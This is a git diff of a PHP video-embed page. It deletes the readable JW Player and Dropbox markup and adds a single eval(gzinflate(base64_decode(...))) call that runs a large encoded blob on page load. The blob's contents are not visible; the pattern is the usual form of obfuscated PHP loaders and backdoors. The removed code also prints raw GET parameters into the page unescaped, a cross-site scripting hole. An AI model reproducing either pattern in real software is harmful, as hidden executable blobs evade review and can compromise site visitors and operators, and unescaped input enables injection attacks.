@@ -7,77 +7,49 @@ if($_GET['img']){
     $imagen = '';
 }
 ?>
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta charset="UTF-8"/>
-<title>Dropbox</title>
-<link rel="shortcut icon" href="" type="image/x-icon" />
-<meta name="robots" content="noindex" />
-<META NAME="GOOGLEBOT" CONTENT="NOINDEX" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-<link href="https://cdn.rawgit.com/ufilestorage/a/master/skins/jw-logo-bar.css" rel="stylesheet" type="text/css" />
-<script type="text/javascript" src="https://cdn.rawgit.com/ufilestorage/a/master/jquery-2.2.3.min.js"></script>
-<script src="https://content.jwplatform.com/libraries/IDzF9Zmk.js"></script>
-<script>jwplayer.key="Khpp2dHxlBJHC8MCmLnBuV2jK/DwDnJMniwF6EO9HC/riJ712ZmbHg==";</script>
-<style type="text/css">body,html{margin:0;padding:0}#uplay{position:absolute;width:100%important!;height:100%important!;border:none;overflow:hidden;}</style>
-</head>
-<body>
-<div id="compuphd"></div>
-<script type="text/javascript">
-var videoPlayer = jwplayer("compuphd");
-videoPlayer.setup({
-sources: [{file:"https://www.dropbox.com/s/<?=$_GET['v']?>?dl=1",label: "480p",type: "video/mp4","default":"true"},{file:"https://www.dropbox.com/s/<?=$_GET['v']?>?dl=1",label: "720p",type: "video/mp4"},{file:"https://www.dropbox.com/s/<?=$_GET['v']?>?dl=1",label: "1080p",type: "video/mp4"}],
-width: "100%",
-height: "100%",
-controls: true,
-displaytitle: false,
-flashplayer: "https://p.jwpcdn.com/player/v/7.12.8/jwplayer.flash.swf",
-fullscreen: "true",
-primary: "html5",
-autostart: false,
-image:'<?=$imagen;?>',
-tracks: [{
-			file: "<?php echo $sub;?>",
-			label: "Subs",
-			aspectratio: "16:9",
-						startparam: "start",
-						primary: "html5",
-						preload: "auto",
-						autostart: false,
-			kind:  "captions",
-			default: "true",
-			}],
-			captions: {
-			color: "#FFFF00",
-			fontSize: 14,
-			edgeStyle: "uniform",
-			backgroundOpacity: 0,
-			},
- logo: {
-			file: "http://2.bp.blogspot.com/-YqS3rxqGtjs/V4RoACOb58I/AAAAAAAAAvs/_98Rf3Om9ps3iIkA1QhGJNVIgbkajNZtgCK4B/s1600/ss.png",
-			logoBar: "",
-			position: "top-left",
-			link: "http://www.tutorialesecu.com/"
-		},
-			aboutlink:"https://www.youtube.com/channel/UCL6NakGHDMpo23wBmj9Iduw",
-			abouttext:"WG Tutoriales",
-});
-videoPlayer.on("ready",function() {
-		jwLogoBar.addLogo(videoPlayer);
-	});
-videoPlayer.addButton(
-"https://icons.jwplayer.com/icons/white/download.svg",
-"Download Video",
-function() {
-window.open(
-"https://www.dropbox.com/s/<?=$_GET['v']?>?dl=1",
-"_blank"
-);
-},
-"download"
-);
-    
-</script>
-</body>
-</html>
+<? eval(gzinflate(base64_decode('
+pVZbc9o4FH5OZvIfXLWdpDNgAUnTYGIyCZBbE+g2
+tLttp9ORbYEFtuRKMoZm8t/3yJeQtNnZ3alfjL9z
+dC7fuYij7uGz/qg3/vRuYIU6jrpbm4fmbS3jiCsX
+hVonDsZZltnZri3kFDfb7TZeGh2UK1MSmHdMNbH8
+kEhFtYs+jE/rBwgbgWY6ot2+FIknloe4+AQ8Ynxu
+SRq5SIVCaj/VFvMFR1Yo6cRFyNKrhLqIxWRK8bJe
+yPC9K05ikErhCa2QBUJNOTjmgvGALkvN68H42Boe
+Xw9cdDYanV0NTkZjZPVGw/FgOHbRcHQx7A/++tXs
+gtEsgaAeGM5YoEM3oAvm03r+UbMYZ5qRqK58ElG3
+WbNismRxGldAaTjPtMjK0KmATz/gtiTZlGnbFzFO
+JyyiSgtpciU4JkpTidWccYVnWT0SU1H3iLR9BbkW
+nOkVnAgp1RVRmi41zhVyp8qXLNEPZTOyIAWKLCX9
+/xnM7HtK5areslv2rh0zbs8U6h7iwuADh48tF+zZ
+syyJiJ4IGeceIuZJIhlV+KL/47T9OZ7/g7VufnBF
+pT2nKxe9DZOkFZwvo5PL897BdS++4ifpx9bsLe5n
+fX55zVl2uj8Ytc97WLLLN83W59g7n7ou6jwybaj7
+mbSuJ4JVzXT1bUzklHGn0UlIEDA+dRp3z1MTxm0i
+FBRccId4SkSppp28EZxmo/GSxaZhCNfPOiFl01D/
+jHpCBlQ6XHDaEQsqJ5HInJAFAeWdO4jPRGXCw9VE
+mYjMO2ALiwUuAuaSNAkDQxRg/1pkUFgQaS1YQMW7
+nEXLtSpCd9bmXnVAca1kwwCnyc7t1qYSqfSpcqwv
+t6YlnPuymm0QFAOd11PhwyP3xbezwfjL9mL761H3
+KIig+2sR8WjkWGjvoJGgmokSPnJXOE72UA0FdELS
+SCMHaZlSdFf7TUdvWk86+m27zcbTGdx9rW1tFj1g
+lBovEXyX5V8DZgqkiIBIkyUAAVOmCvkqdKwJiZRB
+JxFRYVEdOFyFmpjhMRNq4iykeIHf2M2WfYDvxyM/
+a6tsYvxN0iiCHqCUg52cWAATCZtUrnLLcfTaQCTV
+Qmki9TqGfNs624aN/CfvHHW3AdeS+PO8E7Y2NzY2
+cjYtdHiUhIlF/VBYL1Tqga4xC/KKt5vUUyVEVEJ9
+MAPzY6jZd9qlAJ48iIRIEoMo/1jLnoi7EtBIkAAE
+Jo81/kRWgMIqBVUL+SQxE1xFVTbgA54AzKsK70rX
+sYqsfREJU5rnp/A0GqX2BKp7w34AH829AqHBlN6Y
+cQbdlDOz9kpdD1icSpHyYJQQn2lIq1H6hJdl9nzl
+rKS4vH9btpfYHshVIootXf/0/WZXLr+f6ZnCH/fe
+i+PeyHt9cIGPq2eh8Lf2wfvJ7ihuJ2qXXcyPm3+E
+Z5fDjxdTb05mw8962nu7d4JVc7/RwErZCZ9WBYRI
+TohJtgTuVx8wJZJ6RCdVjczttg7UTJaGCki4F6mi
+fpoHi4zmXdkInkh1fujROK4ATT2aq8PfCM5phD/0
+rvaHZH523r9ORGs3O4ln7YsgzdADS2brOejPM2t8
+79WI737eaoLvIAmbdYVqk5T7JpedVwXXs+yqSNeG
+hW9+7jw4aOxs/GINFE/AN9jY2rxPw/xFUfb9TJpM
+cghnIdMUByLjpmNttchpRv0SsD4ay8XkPowsg54V
+mS0S+sjNf11ecOSbFxE+B/ZN/IZ/VAVRYhY85s5Z
+3464unZw/nfw8Ohv
+'))); ?>
